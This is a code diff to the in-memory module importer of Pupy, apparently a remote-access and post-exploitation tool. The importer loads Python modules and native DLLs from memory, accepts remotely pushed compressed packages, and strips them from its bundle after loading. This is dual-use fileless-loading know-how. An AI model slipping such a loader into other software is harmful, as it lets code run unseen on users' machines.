@@ -16,7 +16,7 @@
 # This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
 # Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
 #
-import sys, imp, zlib, marshal
+import sys, imp, marshal
 
 __debug = False;
 
@@ -31,11 +31,12 @@ try:
 except ImportError:
     builtin_memimporter = False
 
-modules={}
+modules = {}
+
 try:
     import pupy
-    if not (hasattr(pupy, 'pseudo') and pupy.pseudo):
-        modules = marshal.loads(zlib.decompress(pupy._get_compressed_library_string()))
+    if not (hasattr(pupy, 'pseudo') and pupy.pseudo) and not modules:
+        modules = pupy.get_modules()
 except ImportError:
     pass
 
@@ -44,7 +45,7 @@ def get_module_files(fullname):
     global modules
     path = fullname.replace('.','/')
 
-    return [
+    files = [
         module for module in modules.iterkeys() \
         if module.rsplit(".",1)[0] == path or any([
             path+'/__init__'+ext == module for ext in [
@@ -53,17 +54,42 @@ def get_module_files(fullname):
         ])
     ]
 
-def pupy_add_package(pkdic):
+    if len(files) > 1:
+        # If we have more than one file, than throw away dlls
+        files = [ x for x in files if not x.endswith('.dll') ]
+
+    return files
+
+def pupy_add_package(pkdic, compressed=False):
     """ update the modules dictionary to allow remote imports of new packages """
     import cPickle
+    import zlib
+
     global modules
+
+    if compressed:
+        pkdic = zlib.decompress(pkdic)
 
     module = cPickle.loads(pkdic)
 
     if __debug:
-        print 'Adding package: {}'.format([ x for x in module.iterkeys() ])
+        print 'Adding files: {}'.format([ x for x in module.iterkeys() ])
 
     modules.update(module)
+
+def has_module(name):
+    global module
+    return name in sys.modules
+
+def invalidate_module(name):
+    global module
+    if not name in sys.modules:
+        raise ValueError('Module {} is not loaded yet'.format(name))
+
+    del sys.modules[name]
+
+def native_import(name):
+    __import__(name)
 
 class PupyPackageLoader:
     def __init__(self, fullname, contents, extension, is_pkg, path):
@@ -80,6 +106,7 @@ class PupyPackageLoader:
             dprint('loading module {}'.format(fullname))
             if fullname in sys.modules:
                 return sys.modules[fullname]
+
             mod=None
             c=None
             if self.extension=="py":
@@ -108,20 +135,22 @@ class PupyPackageLoader:
                 sys.modules[fullname]=mod
                 c=marshal.loads(self.contents[8:])
                 exec c in mod.__dict__
-            elif self.extension in ("dll","pyd","so"):
+            elif self.extension in ("dll", "pyd", "so"):
                 initname = "init" + fullname.rsplit(".",1)[-1]
-                path=fullname.replace(".",'/')+"."+self.extension
+                path = self.fullname.rsplit('.', 1)[0].replace(".",'/') + "." + self.extension
                 dprint('Loading {} from memory'.format(fullname))
-                dprint('init:{}, {}.{}'.format(initname,fullname,self.extension))
+                dprint('init={} fullname={} path={}'.format(initname, fullname, path))
                 mod = _memimporter.import_module(self.contents, initname, fullname, path)
                 mod.__name__=fullname
                 mod.__file__ = '<memimport>/{}'.format(self.path)
                 mod.__loader__ = self
                 mod.__package__ = fullname.rsplit('.',1)[0]
                 sys.modules[fullname]=mod
+
         except Exception as e:
             if fullname in sys.modules:
                 del sys.modules[fullname]
+
             import traceback
             exc_type, exc_value, exc_traceback = sys.exc_info()
             traceback.print_tb(exc_traceback)
@@ -129,25 +158,22 @@ class PupyPackageLoader:
                        'Error while loading package {} ({}) : {}'.format(
                            fullname, self.extension, str(e)))
             raise e
+
         finally:
             imp.release_lock()
-        mod = sys.modules[fullname] # reread the module in case it changed itself
-        return mod
+
+        return sys.modules[fullname]
 
 class PupyPackageFinder:
     def __init__(self, modules):
         self.modules = modules
-        self.modules_list=[
-            x.rsplit(".",1)[0] for x in self.modules.iterkeys()
-        ]
 
     def find_module(self, fullname, path=None):
         imp.acquire_lock()
         try:
             files=[]
             if fullname in ( 'pywintypes', 'pythoncom' ):
-                fullname = fullname + "%d%d" % sys.version_info[:2]
-                fullname = fullname.replace(".", '/') + ".dll"
+                fullname = fullname + '27.dll'
                 files = [ fullname ]
             else:
                 files = get_module_files(fullname)
@@ -155,7 +181,7 @@ class PupyPackageFinder:
             dprint('find_module({},{}) in {})'.format(fullname, path, files))
             if not builtin_memimporter:
                 files = [
-                    f for f in files if not f.lower().endswith((".pyd",".dll",".so"))
+                    f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
                 ]
 
             if not files:
@@ -190,37 +216,46 @@ class PupyPackageFinder:
             if not selected:
                 dprint('{} not found in {}: not in {} files'.format(
                     fullname, selected, len(files)))
+                return None
 
             dprint('{} found in {}'.format(fullname, selected))
             content = self.modules[selected]
+
+            # Don't delete network.conf module
+            if not selected.startswith('network/'):
+                dprint('{} remove {} from bundle'.format(fullname, selected))
+                del self.modules[selected]
+
             extension = selected.rsplit(".",1)[1].strip().lower()
-            is_pkg = any([selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]])
+            is_pkg = any([
+                selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]
+            ])
 
             dprint('--> Loading {} ({}) package={}'.format(
                 fullname, selected, is_pkg))
+
             return PupyPackageLoader(fullname, content, extension, is_pkg, selected)
+
         except Exception as e:
+            dprint('--> Loading {} failed: {}'.format(fullname, e))
             raise e
+
         finally:
             imp.release_lock()
-
-def load_pywintypes():
-    #loading pywintypes27.dll :-)
-    global modules
-    try:
-        import pupy
-        pupy.load_dll("pywintypes27.dll", modules["pywintypes27.dll"])
-    except Exception as e:
-        dprint('Loading pywintypes27.dll.. failed: {}'.format(e))
-        pass
 
 def install(debug=False):
     global __debug
     __debug = debug
-    sys.meta_path.append(PupyPackageFinder(modules))
-    sys.path_importer_cache.clear()
+
+    if builtin_memimporter:
+        sys.meta_path = [ PupyPackageFinder(modules) ]
+        sys.path = []
+        sys.path_importer_cache.clear()
+    else:
+        sys.meta_path.append(PupyPackageFinder(modules))
+
     if 'win' in sys.platform:
-        load_pywintypes()
+        import pywintypes
     if __debug:
         print 'Bundled modules:'
         for module in modules.iterkeys():
